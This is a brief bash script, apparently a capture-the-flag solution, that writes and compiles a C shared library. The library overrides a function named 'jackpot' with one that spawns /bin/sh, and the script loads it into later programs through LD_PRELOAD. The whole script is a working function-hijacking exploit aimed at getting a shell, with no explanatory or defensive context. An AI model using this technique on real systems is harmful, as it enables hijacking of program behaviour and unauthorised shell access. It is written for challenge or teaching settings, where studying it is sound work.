#!/bin/bash

echo -e '#include <stdio.h>\n#include <stdlib.h>\n\nvoid jackpot() {\nprintf("Please make me win!\\n");\n system("/bin/sh");\n}\n' > win.c

gcc -shared -fPIC win.c -o win.so
export LD_PRELOAD=./win.so

